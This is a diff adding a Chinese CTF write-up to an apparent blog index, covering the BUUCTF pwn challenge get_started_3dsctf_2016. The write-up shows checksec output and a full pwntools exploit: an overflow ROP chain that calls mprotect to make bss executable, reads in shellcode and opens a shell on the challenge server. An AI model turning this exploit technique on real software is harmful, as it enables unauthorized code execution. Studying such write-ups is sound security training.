@@ -4,6 +4,31 @@
   
     
     <entry>
+      <title>BUUCTF-get_started_3dsctf_2016</title>
+      <link href="2020/10/01/BUUCTF-get-started-3dsctf-2016/"/>
+      <url>2020/10/01/BUUCTF-get-started-3dsctf-2016/</url>
+      
+        <content type="html"><![CDATA[<h1 id="BUUCTF-get-started-3dsctf-2016"><a href="#BUUCTF-get-started-3dsctf-2016" class="headerlink" title="BUUCTF-get_started_3dsctf_2016"></a>BUUCTF-get_started_3dsctf_2016</h1><h2 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[*] &#x27;/home/dong/Desktop/get_started_3dsctf_2016&#x27;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><img src="/2020/10/01/BUUCTF-get-started-3dsctf-2016/get_started_3dsctf_2016-ida1.png" class><p>程序本身很简单，有一个后门函数</p><img src="/2020/10/01/BUUCTF-get-started-3dsctf-2016/get_started_3dsctf_2016-ida2.png" class><p>在本地可以直接跳到第11行的位置进行攻击，远程不行。</p><p>所以我们想办法提升某一段（bss）的权限，在这里写入shellcode，并进行执行。</p><p>通过vmmap查看，可读写段，</p><img src="/2020/10/01/BUUCTF-get-started-3dsctf-2016/get_started_3dsctf_2016-gdb.png" class><p>heap上面的是bss段，0x80ea000-0x80ec000可写。</p><p>使用mprotect进行权限提升，</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mprotect</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *start, <span class="keyword">size_t</span> len, <span class="keyword">int</span> prot)</span></span>;</span><br><span class="line"><span class="comment">//*start地址的开始地址</span></span><br><span class="line"><span class="comment">//size_t要提升权限的空间大小</span></span><br><span class="line"><span class="comment">/*prot权限等级，</span></span><br><span class="line"><span class="comment">rwx = 4 + 2 + 1 = 7</span></span><br><span class="line"><span class="comment">rw = 4 + 2 = 6</span></span><br><span class="line"><span class="comment">rx = 4 +1 = 5</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line">context.log_level=<span class="string">&quot;DEBUG&quot;</span></span><br><span class="line"><span class="comment">#context.arch=&quot;amd64&quot;</span></span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>,<span class="number">29028</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./get_started_3dsctf_2016&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./get_started_3dsctf_2016&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bss=<span class="number">0x080EB000</span></span><br><span class="line">mprotect=elf.symbols[<span class="string">&quot;mprotect&quot;</span>]</span><br><span class="line">read_plt=elf.symbols[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">pop_3=<span class="number">0x080483b8</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x38</span>+p32(mprotect)+p32(pop_3)+p32(bss)+p32(<span class="number">0x500</span>)+p32(<span class="number">0x7</span>) <span class="comment">#这里我构建栈的结构为通用的结构，pop3是为了平衡栈</span></span><br><span class="line">payload+=p32(read_plt)+p32(pop_3)+p32(<span class="number">0x0</span>)+p32(bss)+p32(<span class="number">0x500</span>)+p32(bss)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">shellcode=asm(shellcraft.sh())</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h2><img src="/2020/10/01/BUUCTF-get-started-3dsctf-2016/get_started_3dsctf_2016-flag.png" class>]]></content>
+      
+      
+      <categories>
+          
+          <category> CTF-PWN </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CTF-PWN </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>攻防世界-time_formatter</title>
       <link href="2020/10/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-time-formatter/"/>
       <url>2020/10/01/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-time-formatter/</url>
